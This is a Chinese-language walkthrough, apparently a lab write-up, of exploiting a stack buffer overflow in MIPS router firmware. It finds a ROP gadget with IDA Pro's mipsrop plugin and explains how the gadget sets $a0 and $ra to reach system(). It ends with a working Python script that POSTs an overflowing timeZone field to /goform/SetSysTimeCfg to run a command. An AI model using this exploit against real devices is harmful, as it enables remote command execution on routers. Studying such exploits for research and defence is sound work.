![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369938017-927f460a-dfe3-4ced-9841-f821b53d2468.png#averageHue=%23101316&clientId=ued6d1bb4-f505-4&from=paste&height=419&id=ufe4bdacb&originHeight=419&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125808&status=done&style=none&taskId=ua3822459-8dc0-4786-80ff-cbfaec807c7&title=&width=942)
输入c运行程序
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369949130-1bd3f5a8-4605-4eba-9d8e-810b258f9c44.png#averageHue=%2309090d&clientId=ued6d1bb4-f505-4&from=paste&height=156&id=uef0f32f7&originHeight=156&originWidth=327&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7753&status=done&style=none&taskId=uaa92f73b-99f8-4a6a-bb54-6cef3aa6b35&title=&width=327)
执行脚本，可以看到了执行了两次welcome to
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711370055635-18bcc5af-5877-425b-a3e3-0aab5062df93.png#averageHue=%23040506&clientId=ued6d1bb4-f505-4&from=paste&height=1188&id=u66240e8e&originHeight=1188&originWidth=1371&originalType=binary&ratio=1&rotation=0&showTitle=false&size=299976&status=done&style=none&taskId=u810d2b0c-d68f-467e-8cff-c86ed84b668&title=&width=1371)
## 获取shell
回到idapro，退出调试
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711368439326-5d08db34-c976-4205-a78d-d3166bb05748.png#averageHue=%23f0ebe9&clientId=ued6d1bb4-f505-4&from=paste&height=98&id=u5a86e8ba&originHeight=98&originWidth=301&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5437&status=done&style=none&taskId=u5a214406-dec6-43ff-89f2-d9644dc174c&title=&width=301)
点击mips rpo gadgets插件
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711366700352-f0347a62-1e54-43c5-b3b3-e1f2f57b5c48.png?x-oss-process=image%2Fformat%2Cwebp#averageHue=%23c0c483&from=url&id=i98hu&originHeight=678&originWidth=722&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在最下面的output窗口输入mipsrop.stackfinder()查找可用的godget
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711368886394-e2d5da46-0e82-486c-8217-faa80d8ae1ae.png#averageHue=%23f5f3f3&clientId=ued6d1bb4-f505-4&from=paste&height=221&id=udbaa15c9&originHeight=221&originWidth=1400&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28042&status=done&style=none&taskId=u573013c6-0b79-426d-a90c-9c4d27f4a92&title=&width=1400)
双击这个地址，跳转到找到的godget地址
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711368950396-9d42211d-af88-4d9f-8ab3-34f6c664a3fc.png#averageHue=%23f8f7f7&clientId=ued6d1bb4-f505-4&from=paste&height=990&id=ude1b2b4d&originHeight=990&originWidth=1503&originalType=binary&ratio=1&rotation=0&showTitle=false&size=173506&status=done&style=none&taskId=ub02db8d0-b130-431d-a8c8-9a84d395c86&title=&width=1503)
```
text:004DB814                 addiu   $a0, $sp, 0x70+var_58
.text:004DB818                 move    $v0, $s1
.text:004DB81C
.text:004DB81C loc_4DB81C:                              # CODE XREF: matrix3desDecrypt+6C↑j
.text:004DB81C                                          # matrix3desDecrypt:loc_4DB88C↓j
.text:004DB81C                 lw      $ra, 0x70+var_4($sp)
.text:004DB820                 lw      $fp, 0x70+var_8($sp)
.text:004DB824                 lw      $s7, 0x70+var_C($sp)
.text:004DB828                 lw      $s6, 0x70+var_10($sp)
.text:004DB82C                 lw      $s5, 0x70+var_14($sp)
.text:004DB830                 lw      $s4, 0x70+var_18($sp)
.text:004DB834                 lw      $s3, 0x70+var_1C($sp)
.text:004DB838                 lw      $s2, 0x70+var_20($sp)
.text:004DB83C                 lw      $s1, 0x70+var_24($sp)
.text:004DB840                 lw      $s0, 0x70+var_28($sp)
.text:004DB844                 jr      $ra
```
首先将0x70+var_58地址的内容放到$a0寄存器里，这里var_58的值在最上面可以看到
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369045753-2b31f42e-e2df-488b-b4ad-692f76627eb5.png#averageHue=%23f7f7f7&clientId=ued6d1bb4-f505-4&from=paste&height=860&id=u8c3bb7af&originHeight=860&originWidth=1037&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113403&status=done&style=none&taskId=udf6e8a97-1c5b-425d-8f13-e4a725080c8&title=&width=1037)
所以将0x70-0x58地址处的值放入了$a0寄存器里，然后将0x70+var_4里的值放入了$ra寄存器里，最后跳转到了$ra寄存器值的地址
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369144985-2fb33966-4b4c-4cf9-ad0e-7f90e957ec65.png#averageHue=%23f8f7f6&clientId=ued6d1bb4-f505-4&from=paste&height=534&id=ub66d0ecf&originHeight=534&originWidth=1310&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94884&status=done&style=none&taskId=u1d38fd58-387d-4c9a-a054-1dc7b643d68&title=&width=1310)
$a0寄存器里存放的是之后函数要调用的参数，而$ra寄存器存放的是返回地址，我们可以构造一个rop链，将我们要执行的参数放入$a0寄存器里，然后使$ra寄存器里存放的是system函数的地址，之后程序会跳转到system函数执行我们输入的参数

shift+f12搜索system函数
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369471197-e0be7233-0cee-4dd1-a174-91753e9a274b.png#averageHue=%23fbf9f8&clientId=ued6d1bb4-f505-4&from=paste&height=999&id=u7b672a11&originHeight=999&originWidth=1481&originalType=binary&ratio=1&rotation=0&showTitle=false&size=158979&status=done&style=none&taskId=uf8097ba1-65d3-43cd-8060-d4f612fb06b&title=&width=1481)
交叉定位到system函数地址处
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369496918-27e75969-57de-4259-89f9-22c54f135a67.png#averageHue=%23f6f6f5&clientId=ued6d1bb4-f505-4&from=paste&height=508&id=uadd6129f&originHeight=508&originWidth=1637&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142044&status=done&style=none&taskId=u75d02cf8-5996-4fa7-b580-43735945484&title=&width=1637)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369507325-d31dbab0-894b-4e44-80c4-06380b5358ac.png#averageHue=%23f5f5f4&clientId=ued6d1bb4-f505-4&from=paste&height=365&id=u108c6223&originHeight=365&originWidth=1322&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58304&status=done&style=none&taskId=ud2d7eb18-a193-4b5a-b49d-4483d91719b&title=&width=1322)
payload = 64垃圾字符+stackfinder地址+填充到参数地址的垃圾字符+system执行的参数+填充到返回地址的垃圾字符+system的地址
```
import requests

url = "http://192.168.85.133/goform/SetSysTimeCfg"
stackfinder = 0X004DB814.to_bytes(4, byteorder='little')
system = 0x004DD820.to_bytes(4, byteorder='little')
data = {
    "timeZone":b'A'*64 + stackfinder + b'C'*20 + b'curl\x00' + b'B'*80+ system
}

res = requests.post(url,data=data)
print(res.text)
```
